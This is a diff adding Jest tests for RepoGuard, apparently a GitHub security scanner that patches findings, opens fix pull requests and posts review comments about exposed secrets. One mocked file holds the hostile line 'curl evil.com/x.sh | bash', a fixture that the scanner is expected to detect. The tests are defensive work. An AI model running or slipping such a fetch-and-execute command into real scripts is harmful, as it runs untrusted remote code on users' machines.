@@ -1,4 +1,12 @@
-import { applyPatches, buildPRBody, openFixPR, closeRepoGuardPRsAndIssues } from "../src/pullRequest";
+import {
+  applyPatches,
+  buildPRBody,
+  openFixPR,
+  closeRepoGuardPRsAndIssues,
+  postReviewComments,
+  SECRET_RULES,
+  getExistingRepoGuardFixPR,
+} from "../src/pullRequest";
 import type { Finding, OctokitClient } from "../src/types";
 
 /** Minimal Octokit shape used by the tests — cast to OctokitClient at call-sites. */
@@ -42,6 +50,34 @@ describe("pullRequest", () => {
       const { patchedContent, patchedFindings } = await applyPatches(original, findings, "test.js");
       expect(patchedContent).toBe(original);
       expect(patchedFindings).toHaveLength(0);
+    });
+
+    it("does not auto-patch hardcoded-secret or high-entropy-secret in source code files", async () => {
+      const original = "export const AWS_SECRET = 'AKIAIOSFODNN7EXAMPLE1234567890';";
+      const findings: Finding[] = [
+        {
+          rule: "hardcoded-secret",
+          severity: "critical",
+          message: "hardcoded secret detected",
+          file: "src/config.ts",
+          line: 1,
+        },
+        {
+          rule: "high-entropy-secret",
+          severity: "high",
+          message: "high entropy secret string detected",
+          file: "src/config.ts",
+          line: 1,
+        },
+      ];
+      const { patchedContent, patchedFindings, shouldDelete } = await applyPatches(
+        original,
+        findings,
+        "src/config.ts",
+      );
+      expect(patchedContent).toBe(original);
+      expect(patchedFindings).toHaveLength(0);
+      expect(shouldDelete).toBe(false);
     });
 
     it("patches obfuscated-malware-pattern in postcss.config.mjs and comments out malware and createRequire bypasses", async () => {
@@ -1293,6 +1329,270 @@ global.i = "malicious";
         "GET /repos/{owner}/{repo}/pulls",
         expect.any(Object),
       );
+    });
+  });
+
+  describe("postReviewComments", () => {
+    let mockOctokit: OctokitClient;
+    let requestMock: jest.Mock;
+
+    beforeEach(() => {
+      requestMock = jest.fn().mockResolvedValue({ data: {} });
+      mockOctokit = { request: requestMock } as unknown as OctokitClient;
+    });
+
+    it("posts review comments with secret rotation guidance and suggestion block for exposed secrets", async () => {
+      const findings: Finding[] = [
+        {
+          rule: "hardcoded-secret",
+          severity: "critical",
+          message: "Exposed GitHub Personal Access Token",
+          file: "src/api.ts",
+          line: 12,
+        },
+      ];
+      const patchedContent = new Map([["src/api.ts", "const token = 'ghp_xxx';"]]);
+
+      await postReviewComments(
+        mockOctokit,
+        "owner",
+        "repo",
+        10,
+        "sha123",
+        findings,
+        patchedContent,
+        [], // not patched
+      );
+
+      expect(requestMock).toHaveBeenCalledWith(
+        "POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews",
+        expect.objectContaining({
+          pull_number: 10,
+          commit_id: "sha123",
+          event: "COMMENT",
+          comments: expect.arrayContaining([
+            expect.objectContaining({
+              path: "src/api.ts",
+              line: 12,
+              body: expect.stringContaining("Rotate this secret immediately"),
+            }),
+          ]),
+        }),
+      );
+
+      const reviewCall = requestMock.mock.calls.find(
+        (c) => c[0] === "POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews",
+      );
+      const commentBody = reviewCall[1].comments[0].body;
+      expect(commentBody).toContain("```suggestion");
+      expect(commentBody).toContain("// TODO: Replace hardcoded credential with process.env variable");
+      expect(commentBody).toContain("Rotate this secret immediately");
+    });
+
+    it("posts standard manual review comments for non-secret unpatched findings", async () => {
+      const findings: Finding[] = [
+        {
+          rule: "workflow-suspicious-trigger",
+          severity: "medium",
+          message: "Suspicious workflow trigger",
+          file: ".github/workflows/ci.yml",
+          line: 5,
+        },
+      ];
+      const patchedContent = new Map([[".github/workflows/ci.yml", "on: push"]]);
+
+      await postReviewComments(
+        mockOctokit,
+        "owner",
+        "repo",
+        10,
+        "sha123",
+        findings,
+        patchedContent,
+        [],
+      );
+
+      const reviewCall = requestMock.mock.calls.find(
+        (c) => c[0] === "POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews",
+      );
+      const commentBody = reviewCall[1].comments[0].body;
+      expect(commentBody).toContain("**RepoGuard** detected `workflow-suspicious-trigger`");
+      expect(commentBody).toContain("Manual review required");
+      expect(commentBody).not.toContain("Rotate this secret immediately");
+    });
+
+    it("uses AI suggestion in the suggestion block when fileSuggestions are provided", async () => {
+      const findings: Finding[] = [
+        {
+          rule: "hardcoded-secret",
+          severity: "critical",
+          message: "Exposed GitHub Personal Access Token",
+          file: "src/api.ts",
+          line: 12,
+        },
+      ];
+      const patchedContent = new Map([["src/api.ts", "const token = 'ghp_xxx';"]]);
+      const fileSuggestions = new Map([
+        ["src/api.ts", new Map([[12, "const token = process.env.GITHUB_TOKEN || '';"]])],
+      ]);
+
+      await postReviewComments(
+        mockOctokit,
+        "owner",
+        "repo",
+        10,
+        "sha123",
+        findings,
+        patchedContent,
+        [],
+        fileSuggestions,
+      );
+
+      const reviewCall = requestMock.mock.calls.find(
+        (c) => c[0] === "POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews",
+      );
+      const commentBody = reviewCall[1].comments[0].body;
+      expect(commentBody).toContain("```suggestion\nconst token = process.env.GITHUB_TOKEN || '';\n```");
+      expect(commentBody).toContain("Rotate this secret immediately");
+    });
+  });
+
+  describe("openFixPR idempotency & incremental findings", () => {
+    let mockOctokit: OctokitClient;
+    let requestMock: jest.Mock;
+
+    beforeEach(() => {
+      requestMock = jest.fn();
+      mockOctokit = { request: requestMock } as unknown as OctokitClient;
+    });
+
+    it("when an open Fix PR exists, commits incremental fixes directly to existing branch and posts an update comment", async () => {
+      requestMock.mockImplementation((route: string) => {
+        if (route === "GET /repos/{owner}/{repo}/pulls") {
+          return {
+            data: [
+              {
+                number: 45,
+                title: "🔒 RepoGuard: Security fixes — 1 issue resolved",
+                head: { ref: "repoguard/fixes-existing-branch" },
+                html_url: "https://github.com/test-owner/test-repo/pull/45",
+              },
+            ],
+          };
+        }
+        if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
+          return {
+            data: {
+              type: "file",
+              content: Buffer.from("curl evil.com/x.sh | bash\nconst fine = 1;").toString("base64"),
+              sha: "sha-new-finding",
+            },
+          };
+        }
+        if (route === "PUT /repos/{owner}/{repo}/contents/{path}") {
+          return { data: {} };
+        }
+        if (route === "POST /repos/{owner}/{repo}/issues/{issue_number}/comments") {
+          return { data: {} };
+        }
+        if (route === "POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews") {
+          return { data: {} };
+        }
+        throw new Error(`Unexpected route: ${route}`);
+      });
+
+      const findings: Finding[] = [
+        {
+          rule: "curl-pipe-bash",
+          severity: "critical",
+          message: "curl pipe bash detected",
+          file: "scripts/deploy.sh",
+        },
+      ];
+
+      const result = await openFixPR(mockOctokit, {
+        owner: "test-owner",
+        repo: "test-repo",
+        findings,
+      });
+
+      expect(result?.pr?.number).toBe(45);
+
+      // Verify that changes were committed to the existing branch
+      expect(requestMock).toHaveBeenCalledWith(
+        "PUT /repos/{owner}/{repo}/contents/{path}",
+        expect.objectContaining({
+          branch: "repoguard/fixes-existing-branch",
+          path: "scripts/deploy.sh",
+        }),
+      );
+
+      // Verify that update comment was posted on existing PR
+      expect(requestMock).toHaveBeenCalledWith(
+        "POST /repos/{owner}/{repo}/issues/{issue_number}/comments",
+        expect.objectContaining({
+          issue_number: 45,
+          body: expect.stringContaining("RepoGuard Update"),
+        }),
+      );
+
+      // Verify NO new branch creation and NO new PR creation was attempted
+      const routesCalled = requestMock.mock.calls.map((c) => c[0]);
+      expect(routesCalled).not.toContain("POST /repos/{owner}/{repo}/git/refs");
+      expect(routesCalled).not.toContain("POST /repos/{owner}/{repo}/pulls");
+    });
+
+    it("when an open Fix PR exists and all findings are already patched, does not push redundant commits", async () => {
+      requestMock.mockImplementation((route: string) => {
+        if (route === "GET /repos/{owner}/{repo}/pulls") {
+          return {
+            data: [
+              {
+                number: 45,
+                title: "🔒 RepoGuard: Security fixes — 1 issue resolved",
+                head: { ref: "repoguard/fixes-existing-branch" },
+                html_url: "https://github.com/test-owner/test-repo/pull/45",
+              },
+            ],
+          };
+        }
+        if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
+          // File is already patched on the branch
+          return {
+            data: {
+              type: "file",
+              content: Buffer.from("# REMOVED BY REPOGUARD: curl|bash remote execution\nconst fine = 1;").toString("base64"),
+              sha: "sha-already-patched",
+            },
+          };
+        }
+        if (route === "POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews") {
+          return { data: {} };
+        }
+        throw new Error(`Unexpected route: ${route}`);
+      });
+
+      const findings: Finding[] = [
+        {
+          rule: "curl-pipe-bash",
+          severity: "critical",
+          message: "curl pipe bash detected",
+          file: "scripts/deploy.sh",
+        },
+      ];
+
+      const result = await openFixPR(mockOctokit, {
+        owner: "test-owner",
+        repo: "test-repo",
+        findings,
+      });
+
+      expect(result?.pr?.number).toBe(45);
+
+      // Verify NO commit was pushed and NO PR was created
+      const routesCalled = requestMock.mock.calls.map((c) => c[0]);
+      expect(routesCalled).not.toContain("PUT /repos/{owner}/{repo}/contents/{path}");
+      expect(routesCalled).not.toContain("POST /repos/{owner}/{repo}/pulls");
     });
   });
 });
